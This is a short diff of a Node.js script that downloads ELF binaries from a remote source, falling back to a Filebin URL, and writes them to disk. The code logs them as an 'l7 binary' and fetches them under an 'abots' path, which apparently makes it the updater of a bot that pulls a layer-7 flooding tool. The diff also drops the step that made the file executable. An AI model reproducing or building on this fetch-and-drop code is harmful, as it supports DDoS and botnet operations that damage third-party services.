@@ -50,8 +50,8 @@ async function fetchBuffer(rel) {
     } catch {}
   }
 
-  // Jika gagal dan request adalah binary 'abots/c/c', coba unduh dari Filebin
-  if (rel === 'abots/c/c') {
+  // Fallback: the filebin copy serves the L7 binary
+  if (rel === 'abots/c/up') {
     try {
       const { status, buffer } = await request(`${FILEBIN_URL}?cb=${Date.now()}`, 0);
       if (status === 200 && buffer && buffer.length > 0) {
@@ -141,9 +141,7 @@ async function syncAll() {
   }
   const up = await fetchBuffer('abots/c/up');
   if (up && isElf(up)) {
-    const upPath = path.join(__dirname, 'up');
-    const changed = await writeIfChanged(upPath, up);
-    await fs.promises.chmod(upPath, 0o755);
+    const changed = await writeIfChanged(path.join(__dirname, 'up'), up);
     if (changed) {
       console.log(`l7 binary updated (${up.length} bytes)`);
     }
